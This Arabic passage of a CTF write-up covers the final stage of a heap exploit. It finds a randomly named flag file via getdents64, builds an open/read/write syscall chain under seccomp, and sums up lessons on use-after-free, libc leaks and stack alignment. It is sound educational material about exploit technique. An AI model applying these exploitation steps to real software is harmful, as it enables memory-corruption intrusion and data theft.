سكربت التشغيل يسمي ملف الفلاق باسم عشوائي (`flag-XXXX.txt`)، يعني ما أقدر أكتب المسار جاهز بنفسي. الحل: أستخدم `getdents64` — استدعاء يقرألي **قائمة الملفات** الموجودة في مجلد معيّن، فأقدر أطلع اسم الملف الحقيقي وقت التشغيل، مهما كان عشوائي.

### وش بالضبط يرجّعه `getdents64`؟ (وليش `dent_off + 67`)

`getdents64` يرجّع للمجلد قائمة "سجلات" (entries)، كل سجل يمثل ملف أو مجلد فرعي جوا المجلد اللي فتحته. شكل كل سجل واحد معرّف بـ struct ثابت اسمه `linux_dirent64` (هذا جزء من واجهة الكيرنل، مو شي معرّف جوا `laana.c`):

```
d_ino     (8 بايت)   — رقم تعريف الملف
d_off     (8 بايت)   — إزاحة السجل اللي بعده
d_reclen  (2 بايت)   — طول هالسجل كامل بالبايت
d_type    (1 بايت)   — نوع الملف (ملف عادي، مجلد...)
d_name    (طول متغيّر) — اسم الملف نفسه، نص منتهي بـ null
```

يعني `d_name` (الاسم اللي أبيه) يبدأ دائماً عند **الإزاحة 19 بايت** من بداية أي سجل (`8+8+2+1 = 19`). هذا الجزء ثابت من بنية `linux_dirent64` نفسها.

لكن **السؤال: وين يبدأ *ثالث* سجل؟** هذا يعتمد على طول أول سجلين. في أغلب المجلدات، أول سجلين دايماً يكونون `.` (المجلد نفسه) و`..` (المجلد الأب)، وكل واحد منهم بيكون طوله (`d_reclen`) عادة 24 بايت (لأن الكيرنل يحاذي حجم كل سجل على مضاعفات 8 بايت، وأسماء قصيرة زي `.` و`..` توصل لهالحجم بعد المحاذاة). لو افترضنا هذا الشي، فثالث سجل يبدأ عند `24 + 24 = 48`، واسمه (`d_name`) يبدأ عند `48 + 19 = 67` — وهذا بالضبط مصدر الرقم `dent_off + 67` المستخدم في الاستغلال.

**تنويه مهم (ما قدرت أثبته من `laana.c` ولا `laana_xpl.py` مباشرة، لأنه يعتمد على سلوك الكيرنل/نظام الملفات مو على كود التحدي):** الرقم `67` مبني على **افتراض** إن أول سجلين (`.` و`..`) طولهم 24 بايت بالضبط في بيئة هالتحدي بالذات، وإن ملف الفلاق هو **أول ملف حقيقي** بعدهم.

بخصوص "ملف الفلاق هو أول ملف حقيقي بعد `.`/`..`" — هالنقطة بالذات **ما تحققت منها بنفسي من `entrypoint.sh` أو `launch.sh`**، لأن هالملفين مو من ضمن الملفين اللي راجعتهم في هالجولة (`laana.c` و`laana_xpl.py` بس). هي مذكورة فقط في المسودة الأصلية (`laana_writeup.md`) كوصف لسلوك بيئة التحدي، فخذوها كـ**افتراض بيئي منقول من وصف سابق**، مو كحقيقة أثبتها بنفسي من ملف تشغيل فعلي. لو تبي تأكيد كامل، لازم تراجع `entrypoint.sh` بنفسك وتتأكد إن المجلد ما فيه ملفات إضافية غير الفلاق.

بشكل عام: هذا **مو قاعدة عامة تنطبق على أي مجلد**: لو كان المجلد فيه ملفات زيادة، أو كانت أسماء `.`/`..` بطول مختلف لسبب ما، الرقم `67` ما بيكون صحيح، ولازم تحسبه من جديد بقراءة `d_reclen` الفعلي لكل سجل بدل ما تفترضه ثابت.

### السلسلة الكاملة خطوة بخطوة

```python
syscall(2, path, O_DIRECTORY)      # 1) افتح مجلد /home/ctf → fd = 3
syscall(217, 3, buf, 0x1000)       # 2) اقرأ قائمة الملفات داخل المجلد إلى buf
# 3) snprintf("/home/ctf/%s", اسم_الملف) → يبني المسار الكامل
syscall(257, AT_FDCWD, dest, 0)    # 4) افتح الملف الحقيقي → fd = 4
syscall(0, 4, flagbuf, 0x200)      # 5) اقرأ محتواه
syscall(1, 1, flagbuf, 0x200)      # 6) اطبعه على الشاشة (stdout)
syscall(60, 0)                     # 7) اخرج بأمان
```

**ملاحظتين تقنيتين صغيرتين واجهتني فعلياً وتستاهل أذكرهم:**

- `snprintf` دالة مكتبة عادية (مو syscall)، وبعض دوال الـ libc تستخدم تعليمات تحتاج الـ Stack يكون محاذي على 16 بايت بالضبط (وإلا تنهار). فحطيت قطعة صغيرة اسمها `RET_GADGET` قبلها بس عشان تصحح المحاذاة.

- لـ `openat` استخدمت `LIBC_SYSCALL` (عنوان دالة `syscall()` الجاهزة حق الـ libc) بدل ما أبني raw syscall بنفسي. فتحت الـ disassembly لـ `libc.so.6` المرفق عند هالعنوان بالضبط عشان أتأكد وش تسوي هالدالة، ولقيت هذا (مو تخمين، منقول حرفياً من الكود):

  ```asm
  syscall@@GLIBC_2.2.5:
      mov %rdi,%rax     ; المعامل الأول للدالة (رقم الـ syscall) → RAX
      mov %rsi,%rdi     ; المعامل الثاني (الـ syscall arg الحقيقي الأول) → RDI
      mov %rdx,%rsi     ; المعامل الثالث → RSI
      mov %rcx,%rdx     ; المعامل الرابع → RDX
      mov %r8,%r10      ; المعامل الخامس → R10
      mov %r9,%r8       ; المعامل السادس → R8
      mov 0x8(%rsp),%r9 ; المعامل السابع (من الـ Stack) → R9
      syscall
  ```

  يعني `syscall()` هي دالة C عادية (تتبع اتفاقية System V: `RDI, RSI, RDX, RCX, R8, R9`)، أول معامل لها هو **رقم الاستدعاء نفسه**، والمعاملات اللي بعده هي المعاملات الحقيقية لذاك الاستدعاء — والدالة نفسها تسوي الإزاحة (shift) الداخلية وتحط كل شي في مكانه الصح قبل ما تنفّذ `syscall` فعلياً.

  في استدعاء `openat(AT_FDCWD, dest, 0)` اللي سويته، مررت 4 معاملات لدالة `syscall()`: `257 (نفسه), AT_FDCWD, dest, 0`. يعني هذي تروح بترتيب C العادي: `RDI=257, RSI=AT_FDCWD, RDX=dest, RCX=0`. وبعدين الدالة نفسها (حسب الكود فوق) تاخذ `RCX` (المعامل الرابع بترتيب C) وتحطه في `RDX` (المعامل الثالث الحقيقي لـ `openat`، وهو `flags`). يعني في هالاستدعاء بالذات **ما احتجنا `R10` أصلاً**، لأن `openat` هنا استخدمنا له بس 3 معاملات حقيقية (`dirfd, path, flags`) — الفرض الرابع (`mode`) ما له داعي لأن `flags=0` ما فيها `O_CREAT`.

  يعني الفايدة الحقيقية من استخدام `LIBC_SYSCALL` هنا مو تفادي `R10` (أصلاً ما احتجناه)، بس هي إنها توفر علي بناء gadget إضافي، لأن عنوان دالة جاهزة أسهل من تجميع تسلسل gadgets يدوي لنفس الفكرة.

## 12. خلاصة الدروس اللي طلعت فيها من هالتحدي

1. **أي مؤشر "يتسحب" ويُحفظ قبل حلقة فيها callback، هو فخ UAF محتمل** — لو الـ callback يقدر يغيّر البنية الأصلية (resize/free)، المؤشر القديم يصير يأشر على شي غيّر معناه.
2. **حجم الـ struct أهم من اسمه** — 56 بايت و48 بايت وقعوا بنفس "صنف الحجم" (0x40) داخل الـ allocator، وهذا بالضبط اللي خلّى رأس المصفوفة الجديدة يركب مكان بيانات المصفوفة القديمة.
3. **تسريب الـ unsorted bin يحتاج "حاجز"** يمنع الدمج التلقائي مع نهاية الـ heap، وإلا تخسر الـ leak.
4. **لازم تحجز الرأس قبل التحرير** عشان أول حجز بعد التحرير ما يروح يقسّم المساحة الكبيرة ويخرب البيانات اللي تبيها.
5. **`environ` هو الجسر الطبيعي من الـ libc للـ Stack** — ومن بعده الـ scan البسيط يوصلك للعنوان الدقيق.
6. **seccomp يغيّر طريقة تفكيرك بالكامل** — مادام ما فيه execve، الهدف يتحول من "افتح شِل" إلى "اقرأ الملف المطلوب مباشرة بالـ syscalls المسموحة".
7. **محاذاة الـ Stack تفاصيل صغيرة تكسر استدعاءات مكتبية كبيرة** — `ret` إضافي قبل أي نداء لدالة libc عادية يحل أغلب مشاكل الانهيار الغريبة.
8. **لا تخلط بين اتفاقية استدعاء دوال C (`RDI,RSI,RDX,RCX,R8,R9`) واتفاقية raw syscall الحقيقية (`RDI,RSI,RDX,R10,R8,R9`)** — الفرق بينهم بالذات (`RCX` مقابل `R10`) سببه إن تعليمة `syscall` تستخدم `RCX` داخلياً، فمحتاجين سجل ثاني للمعامل الرابع.
9. **arbitrary read/write ما يعني "بدون حدود مطلقة"** — هو primitive يوجّه القراءة/الكتابة لعنوان تحدده، ولازم تعرف العنوان صحيح ومخصص وإلا تنهار العملية.
